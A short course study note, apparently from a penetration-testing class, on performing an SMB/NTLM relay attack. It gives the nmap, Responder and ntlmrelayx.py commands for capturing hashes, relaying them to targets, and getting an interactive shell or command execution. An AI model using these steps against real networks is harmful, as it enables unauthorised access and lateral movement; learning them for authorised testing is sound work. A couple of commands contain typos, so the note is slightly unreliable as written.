---
tags:
  - smb-relay
  - ntlm-relay
  - responder
  - lateral-movement
  - active-directory
  - windows
  - course/tcm-academy
---
# smb relay attack
*   Instead of crack hash caught by responder we can relay those hashes to specific machine and potentially gain access
*   smb signing must be disabled or not enforced
*   relay user credentials must be admin

First we should notice if smb signing is enabled:

```text-plain
nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24 -Pn
```

Then we must edit the file /etc/responder/Responder.conf and turn smb and http to off cuz we do not want to capture we want to relay

Then fetch the hashes with

```text-plain
sudo responder I wlan0 -dwpv
```

During responder is running Then use another tool called ntlmrelax.py to relay the hash

```text-plain
ntlmrelayx.py -tf targets.txt --smb2support
```

We can use -i to interact with a reverse shell

```text-plain
ntlmrelayx.py -tf targets.txt --smb2support -i 
```

We can use -c to execute commands

```text-plain
ntlmrelayx.py -tf targets.txt --smb2support -c "whoami"
```

